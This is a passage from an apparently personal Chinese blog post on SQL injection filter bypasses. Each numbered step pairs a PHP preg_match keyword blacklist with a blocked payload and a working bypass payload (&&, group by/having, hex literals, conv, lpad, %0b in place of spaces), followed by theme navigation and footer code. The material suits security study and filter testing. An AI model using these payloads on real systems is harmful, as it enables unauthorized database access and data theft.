+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 &amp;&amp; (<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> user_id=<span class="number">1</span>)=<span class="string">'admin'</span></span><br></pre></td></tr></table></figure>
+<h3 id="3-过滤关键字-and-or-union-where"><a href="#3-过滤关键字-and-or-union-where" class="headerlink" title="3. 过滤关键字 and or union where"></a>3. 过滤关键字 and or union where</h3><p>php代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(<span class="string">'/(and|or|union)/i'</span>,$id)</span><br></pre></td></tr></table></figure></p>
+<p>会过滤的代码<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 &amp;&amp; (<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> user_id = <span class="number">1</span>) = <span class="string">'admin'</span></span><br></pre></td></tr></table></figure></p>
+<p>绕过方式<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 &amp;&amp; (<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">1</span>) = <span class="string">'admin'</span></span><br></pre></td></tr></table></figure></p>
+<h3 id="4-过滤关键字-and-or-union-where-limit"><a href="#4-过滤关键字-and-or-union-where-limit" class="headerlink" title="4. 过滤关键字: and or union where limit"></a>4. 过滤关键字: and or union where limit</h3><p>php代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(<span class="string">'/(and|or|union|where|limit)/i'</span>, $id)</span><br></pre></td></tr></table></figure>
+<p>会过滤的攻击代码<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 &amp;&amp; (<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">1</span>) = <span class="string">'admin'</span></span><br></pre></td></tr></table></figure></p>
+<p>绕过方式<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 &amp;&amp; (<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">group</span> <span class="keyword">by</span> user_id <span class="keyword">having</span> user_id = <span class="number">1</span>) = <span class="string">'admin'</span>     #user_id聚合中user_id为<span class="number">1</span>的<span class="keyword">user</span>为<span class="keyword">admin</span></span><br></pre></td></tr></table></figure></p>
+<h3 id="5-过滤关键字-and-or-union-where-limit-group-by"><a href="#5-过滤关键字-and-or-union-where-limit-group-by" class="headerlink" title="5. 过滤关键字: and or union where limit group by"></a>5. 过滤关键字: and or union where limit group by</h3><p>php代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(<span class="string">'/(and|or|union|where|limit|group by)/i'</span>, $id)</span><br></pre></td></tr></table></figure></p>
+<p>会过滤的攻击代码<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 &amp;&amp; (<span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">group</span> <span class="keyword">by</span> user_id <span class="keyword">having</span> user_id = <span class="number">1</span>) = <span class="string">'admin'</span></span><br></pre></td></tr></table></figure></p>
+<p>绕过方式<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 &amp;&amp; (<span class="keyword">select</span> <span class="keyword">substr</span>(<span class="keyword">group_concat</span>(user_id),<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">user</span> <span class="keyword">from</span> <span class="keyword">users</span> ) = <span class="number">1</span></span><br></pre></td></tr></table></figure></p>
+<h3 id="6-过滤关键字-and-or-union-where-limit-group-by-select"><a href="#6-过滤关键字-and-or-union-where-limit-group-by-select" class="headerlink" title="6. 过滤关键字: and or union where limit group by select"></a>6. 过滤关键字: and or union where limit group by select</h3><p>php代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(<span class="string">'/(and|or|union|where|limit|group by|select)/i'</span>, $id)</span><br></pre></td></tr></table></figure></p>
+<p>会过滤的攻击代码<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 &amp;&amp; (<span class="keyword">select</span> <span class="keyword">substr</span>(gruop_concat(user_id),<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">user</span> <span class="keyword">from</span> <span class="keyword">users</span>) = <span class="number">1</span></span><br></pre></td></tr></table></figure></p>
+<p>绕过方式<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 &amp;&amp; substr(user,1,1) = 'a'</span><br></pre></td></tr></table></figure></p>
+<h3 id="7-过滤关键字-and-or-union-where-limit-group-by-select-‘"><a href="#7-过滤关键字-and-or-union-where-limit-group-by-select-‘" class="headerlink" title="7. 过滤关键字: and or union where limit group by select ‘"></a>7. 过滤关键字: and or union where limit group by select ‘</h3><p>php代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(<span class="string">'/(and|or|union|where|limit|group by|select|\')/i'</span>, $id)</span><br></pre></td></tr></table></figure></p>
+<p>会过滤的攻击代码<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 &amp;&amp; (<span class="keyword">select</span> <span class="keyword">substr</span>(gruop_concat(user_id),<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">user</span> <span class="keyword">from</span> <span class="keyword">users</span>) = <span class="number">1</span></span><br></pre></td></tr></table></figure></p>
+<p>绕过方式<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 &amp;&amp; user_id is not null 1 &amp;&amp; substr(user,1,1) = 0x61 1 &amp;&amp; substr(user,1,1) = unhex(61)</span><br></pre></td></tr></table></figure></p>
+<h3 id="8-过滤关键字-and-or-union-where-limit-group-by-select-‘-hex"><a href="#8-过滤关键字-and-or-union-where-limit-group-by-select-‘-hex" class="headerlink" title="8. 过滤关键字: and or union where limit group by select ‘ hex"></a>8. 过滤关键字: and or union where limit group by select ‘ hex</h3><p>php代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(<span class="string">'/(and|or|union|where|limit|group by|select|\'|hex)/i'</span>, $id)</span><br></pre></td></tr></table></figure></p>
+<p>会过滤的攻击代码<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 &amp;&amp; substr(user,1,1) = unhex(61)</span><br></pre></td></tr></table></figure></p>
+<p>绕过方式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 &amp;&amp; substr(user,1,1) = lower(conv(11,10,16)) #十进制的11转化为十六进制，并小写。</span><br></pre></td></tr></table></figure></p>
+<h3 id="9-过滤关键字-and-or-union-where-limit-group-by-select-‘-hex-substr"><a href="#9-过滤关键字-and-or-union-where-limit-group-by-select-‘-hex-substr" class="headerlink" title="9. 过滤关键字:and or union where limit group by select ‘ hex substr"></a>9. 过滤关键字:and or union where limit group by select ‘ hex substr</h3><p>php代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(<span class="string">'/(and|or|union|where|limit|group by|select|\'|hex|substr)/i'</span>, $id)</span><br></pre></td></tr></table></figure></p>
+<p>会过滤的攻击代码<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 &amp;&amp; substr(user,1,1) = lower(conv(11,10,16))</span><br></pre></td></tr></table></figure></p>
+<p>绕过方式<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 &amp;&amp; lpad(user,7,1)</span><br></pre></td></tr></table></figure></p>
+<h3 id="10-过滤关键字-and-or-union-where-limit-group-by-select-‘-hex-substr-空格"><a href="#10-过滤关键字-and-or-union-where-limit-group-by-select-‘-hex-substr-空格" class="headerlink" title="10. 过滤关键字:  and or union where limit group by select ‘ hex substr 空格"></a>10. 过滤关键字:  and or union where limit group by select ‘ hex substr 空格</h3><p>php代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(<span class="string">'/(and|or|union|where|limit|group by|select|\'|hex|substr|\s)/i'</span>, $id)</span><br></pre></td></tr></table></figure></p>
+<p>会过滤的攻击代码<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 &amp;&amp; lpad(user,7,1)</span><br></pre></td></tr></table></figure></p>
+<p>绕过方式<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1%0b||%0blpad(user,7,1)</span><br></pre></td></tr></table></figure></p>
+
+        
+    
+
+    
+</div>
+
+
+                
+
+                <!-- Post Comments -->
+                
+                    
+                
+            </div>
+
+            <!-- Post Prev & Next Nav -->
+            <nav class="material-nav mdl-color-text--grey-50 mdl-cell mdl-cell--12-col">
+    <!-- Prev Nav -->
+    
+
+    <!-- Section Spacer -->
+    <div class="section-spacer"></div>
+
+    <!-- Next Nav -->
+    
+        <a href="/2018/05/24/1/" id="post_nav-older" class="next-content">
+            旧篇
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+            <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
+                <i class="material-icons">arrow_forward</i>
+            </button>
+        </a>
+    
+</nav>
+
+        </div>
+    </div>
+
+
+
+                    
+                        <!-- Overlay For Active Sidebar -->
+<div class="sidebar-overlay"></div>
+
+<!-- Material sidebar -->
+<aside id="sidebar" class="sidebar sidebar-colored sidebar-fixed-left" role="navigation">
+    <div id="sidebar-main">
+        <!-- Sidebar Header -->
+        <div class="sidebar-header header-cover" style="background-image: url(/img/sidebar_header.png);">
+    <!-- Top bar -->
+    <div class="top-bar"></div>
+
+    <!-- Sidebar toggle button -->
+    <button type="button" class="sidebar-toggle mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon" style="display: initial;" data-upgraded=",MaterialButton,MaterialRipple">
+        <i class="material-icons">clear_all</i>
+        <span class="mdl-button__ripple-container">
+            <span class="mdl-ripple">
+            </span>
+        </span>
+    </button>
+
+    <!-- Sidebar Avatar -->
+    <div class="sidebar-image">
+        <img src="/img/avatar.png" alt="张Mini's avatar">
+    </div>
+
+    <!-- Sidebar Email -->
+    <a data-toggle="dropdown" class="sidebar-brand" href="#settings-dropdown">
+        718067115@qq.com
+        <b class="caret"></b>
+    </a>
+</div>
+
+
+        <!-- Sidebar Navigation  -->
+        <ul class="nav sidebar-nav">
+    <!-- User dropdown  -->
+    <li class="dropdown">
+        <ul id="settings-dropdown" class="dropdown-menu">
+            
+                <li>
+                    <a href="#" target="_blank" title="Email Me">
+                        
+                            <i class="material-icons sidebar-material-icons sidebar-indent-left1pc-element">email</i>
+                        
+                        Email Me
+                    </a>
+                </li>
+            
+        </ul>
+    </li>
+
+    <!-- Homepage -->
+    
+        <li id="sidebar-first-li">
+            <a href="/">
+                
+                    <i class="material-icons sidebar-material-icons">home</i>
+                
+                主页
+            </a>
+        </li>
+        
+    
+
+    <!-- Archives  -->
+    
+        <li class="dropdown">
+            <a href="#" class="ripple-effect dropdown-toggle" data-toggle="dropdown">
+                
+                    <i class="material-icons sidebar-material-icons">inbox</i>
+                
+                    归档
+                <b class="caret"></b>
+            </a>
+            <ul class="dropdown-menu">
+            <li>
+                <a class="sidebar_archives-link" href="/archives/2018/05/">五月 2018<span class="sidebar_archives-count">2</span></a>
+            </ul>
+        </li>
+        
+    
+
+    <!-- Categories  -->
+    
+
+    <!-- Pages  -->
+    
+
+    <!-- Article Number  -->
+    
+</ul>
+
+
+        <!-- Sidebar Footer -->
+        <!--
+I'm glad you use this theme, the development is no so easy, I hope you can keep the copyright, I will thank you so much.
+If you still want to delete the copyrights, could you still retain the first one? Which namely "Theme Material"
+It will not impact the appearance and can give developers a lot of support :)
+
+很高兴您使用并喜欢该主题，开发不易 十分谢谢与希望您可以保留一下版权声明。
+如果您仍然想删除的话 能否只保留第一项呢？即 "Theme Material"
+它不会影响美观并可以给开发者很大的支持和动力。 :)
+-->
+
+<!-- Sidebar Divider -->
+
+    <div class="sidebar-divider"></div>
+
+
+<!-- Theme Material -->
+
+    <a href="https://github.com/viosey/hexo-theme-material"  class="sidebar-footer-text-a" target="_blank">
+        <div class="sidebar-text mdl-button mdl-js-button mdl-js-ripple-effect sidebar-footer-text-div" data-upgraded=",MaterialButton,MaterialRipple">
+            主题 - Material
+            <span class="sidebar-badge badge-circle">i</span>
+        </div>
+    </a>
+
+
+<!-- Help & Support -->
+<!--
+
+-->
+
+<!-- Feedback -->
+<!--
+
+-->
+
+<!-- About Theme -->
+<!--
+
+-->
+
+    </div>
+
+    <!-- Sidebar Image -->
+    
+
+</aside>
+
+                    
+
+                    
+                        <!-- Footer Top Button -->
+                        <div id="back-to-top" class="toTop-wrap">
+    <a href="#top" class="toTop">
+        <i class="material-icons footer_top-i">expand_less</i>
+    </a>
+</div>
+
+                    
+
+                    <!--Footer-->
+<footer class="mdl-mini-footer" id="bottom">
+    
+        <!-- Paradox Footer Left Section -->
+        <div class="mdl-mini-footer--left-section sns-list">
+    <!-- Twitter -->
+    
+
+    <!-- Facebook -->
+    
+
+    <!-- Google + -->
+    
+        <a href="https://www.google.com/" target="_blank">
+            <button class="mdl-mini-footer--social-btn social-btn footer-sns-gplus">
+                <span class="visuallyhidden">Google Plus</span>
+            </button><!--
+     --></a>
+    
+
+    <!-- Weibo -->
+    
+
+    <!-- Instagram -->
+    
+
+    <!-- Tumblr -->
+    
+
+    <!-- Github -->
+    
+        <a href="https://www.github.com/AlittleXYZ" target="_blank">
+            <button class="mdl-mini-footer--social-btn social-btn footer-sns-github">
+                <span class="visuallyhidden">Github</span>
+            </button><!--
+     --></a>
+    
+
+    <!-- LinkedIn -->
+    
+
+    <!-- Zhihu -->
+    
+
+    <!-- Bilibili -->
+    
+
+    <!-- Telegram -->
+    
+    
+    <!-- V2EX -->
+    
+</div>
+
+
+        <!--Copyright-->
+        <div id="copyright">
+            Copyright&nbsp;©<script type="text/javascript">var fd = new Date();document.write("&nbsp;" + fd.getFullYear() + "&nbsp;");</script>张Mini
+            
+        </div>
+
+        <!-- Paradox Footer Right Section -->
+
+        <!--
+        I am glad you use this theme, the development is no so easy, I hope you can keep the copyright.
+        It will not impact the appearance and can give developers a lot of support :)
+
+        很高兴您使用该主题，开发不易，希望您可以保留一下版权声明。
+        它不会影响美观并可以给开发者很大的支持。 :)
+        -->
+
+        <div class="mdl-mini-footer--right-section">
+            <div>
+                <div class="footer-develop-div">Powered by <a href="https://hexo.io" target="_blank" class="footer-develop-a">Hexo</a></div>
+                <div class="footer-develop-div">Theme - <a href="https://github.com/viosey/hexo-theme-material" target="_blank" class="footer-develop-a">Material</a></div>
+            </div>
+        </div>
+    
+</footer>
+
+
+                    <!-- Import JS File -->
+
+    <script>lsloader.load("lazyload_js","/js/lazyload.min.js?1BcfzuNXqV+ntF6gq+5X3Q==", true)</script>
+
+
+
+    <script>lsloader.load("js_js","/js/js.min.js?V/53wGualMuiPM3xoetD5Q==", true)</script>
+
+
+
+    <script>lsloader.load("np_js","/js/nprogress.js?pl3Qhb9lvqR1FlyLUna1Yw==", true)</script>
+
+
+<script type="text/ls-javascript" id="NProgress-script">
+    NProgress.configure({
+        showSpinner: true
+    });
+    NProgress.start();
+    $('#nprogress .bar').css({
+        'background': '#29d'
+    });
+    $('#nprogress .peg').css({
+        'box-shadow': '0 0 10px #29d, 0 0 15px #29d'
+    });
+    $('#nprogress .spinner-icon').css({
+        'border-top-color': '#29d',
+        'border-left-color': '#29d'
+    });
+    setTimeout(function() {
+        NProgress.done();
+        $('.fade').removeClass('out');
+    }, 800);
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- UC Browser Compatible -->
+<script>
+	var agent = navigator.userAgent.toLowerCase();
+	if(agent.indexOf('ucbrowser')>0) {
+		document.write('<link rel="stylesheet" href="/css/uc.css">');
+	   alert('由于 UC 浏览器使用极旧的内核，而本网站使用了一些新的特性。\n为了您能更好的浏览，推荐使用 Chrome 或 Firefox 浏览器。');
+	}
+</script>
+
+<!-- Import prettify js  -->
+
+
+
+<!-- Window Load -->
+<!-- add class for prettify -->
+<script type="text/ls-javascript" id="window-load">
+    $(window).on('load', function() {
+        // Post_Toc parent position fixed
+        $('.post-toc-wrap').parent('.mdl-menu__container').css('position', 'fixed');
+    });
+
+    
+    
+</script>
+
+<!-- MathJax Load-->
+
+
+<!-- Bing Background -->
+
+
+<script type="text/ls-javascript" id="lazy-load">
+    // Offer LazyLoad
+    queue.offer(function(){
+        $('.lazy').lazyload({
+            effect : 'show'
+        });
+    });
+
+    // Start Queue
+    $(document).ready(function(){
+        setInterval(function(){
+            queue.execNext();
+        },200);
+    });
+</script>
+
+<!-- Custom Footer -->
+
+
+
+<script>
+    (function(){
+        var scriptList = document.querySelectorAll('script[type="text/ls-javascript"]')
+
+        for (var i = 0; i < scriptList.length; ++i) {
+            var item = scriptList[i];
+            lsloader.runInlineScript(item.id,item.id);
+        }
+    })()
+console.log('\n %c © Material Theme | Version: 1.5.2 | https://github.com/viosey/hexo-theme-material %c \n', 'color:#455a64;background:#e0e0e0;padding:5px 0;border-top-left-radius:5px;border-bottom-left-radius:5px;', 'color:#455a64;background:#e0e0e0;padding:5px 0;border-top-right-radius:5px;border-bottom-right-radius:5px;');
+</script>
+
+                </main>
+            </div>
+        </body>
+    
+</html>
